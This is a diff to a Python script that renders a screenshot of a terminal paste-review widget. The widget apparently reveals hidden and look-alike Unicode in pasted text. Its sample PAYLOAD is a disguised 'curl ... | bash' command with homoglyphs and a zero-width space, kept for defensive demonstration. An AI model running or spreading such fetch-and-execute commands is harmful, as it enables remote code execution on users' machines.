@@ -75,6 +75,14 @@ PAYLOAD = ('curl -fsSL https://ex\u0430mple.com/get.sh | b\u0430sh\u200b'
 # down -- the anti-fat-finger gate, visible.
 COUNTDOWN_SECONDS = 4
 
+# The delivery mode the shot picks so the mirror renders the DELIVERED form (naming
+# each hidden character inline) instead of the radio-first "choose a mode" hint.
+# 'unicode' (Keep unicode) keeps the printable look-alikes, so the mirror names them;
+# 'stripped' would render pure ASCII, naming nothing -- so 'unicode' is what makes the
+# shot actually demonstrate the unicode detection. shot_generators_smoke_test asserts
+# the mirror shows this render, not the hint.
+DELIVERY_MODE = 'unicode'
+
 # Uniform frame kept around the content after trimming (px). The ReviewBar's
 # preview panes have a 130px minimum height (review.py setMinimumSize) but the
 # shot's payload is one line, so Qt reserves a screenful of empty pane below the
@@ -186,6 +194,25 @@ def _trim_to_content(image, bg, margin):
     return out
 
 
+def build_review(host, kind, delay):
+    """Build the review bar inside `host` for `kind` ('paste'/'copy'), holding the
+    PAYLOAD, and PICK a delivery mode so the mirror renders the DELIVERED form -- naming
+    each hidden character inline in detail mode -- instead of the radio-first "choose a
+    mode" hint. The bar is radio-first: with no mode picked the mirror shows only the
+    hint, which hides the very unicode-revealing render this shot exists to demonstrate.
+    DELIVERY_MODE='unicode' keeps the printable look-alikes so the mirror names them (the
+    strip form would render pure ASCII, naming nothing); it also arms the countdown so the
+    deliver button shows its disabled countdown state. Returns the bar. Factored out so
+    shot_generators_smoke_test can assert the mirror shows the render, not the hint."""
+    layout = QVBoxLayout(host)
+    layout.setContentsMargins(0, 0, 0, 0)
+    bar = ReviewBar(host)
+    layout.addWidget(bar)
+    bar.show_review(_Term(), PAYLOAD, delay, kind)
+    bar._on_radio(DELIVERY_MODE)
+    return bar
+
+
 def main(argv):
     if not 2 <= len(argv) <= 3 or (len(argv) == 3 and argv[2] not in ('paste', 'copy')):
         sys.stderr.write('usage: %s <output.png> [paste|copy]\n' % argv[0])
@@ -200,11 +227,7 @@ def main(argv):
     _theme_palette(app)
 
     host = QWidget()
-    layout = QVBoxLayout(host)
-    layout.setContentsMargins(0, 0, 0, 0)
-    bar = ReviewBar(host)
-    layout.addWidget(bar)
-    bar.show_review(_Term(), PAYLOAD, delay, kind)
+    bar = build_review(host, kind, delay)
     # Drop the auto scrollbars so the shot has no stray scrollbar. Width sized so
     # the mirror's inline-expanded line + the button row are roomy (the detail-mode
     # <U+XXXX NAME> expansion makes the line long; the word-wrapping summary would
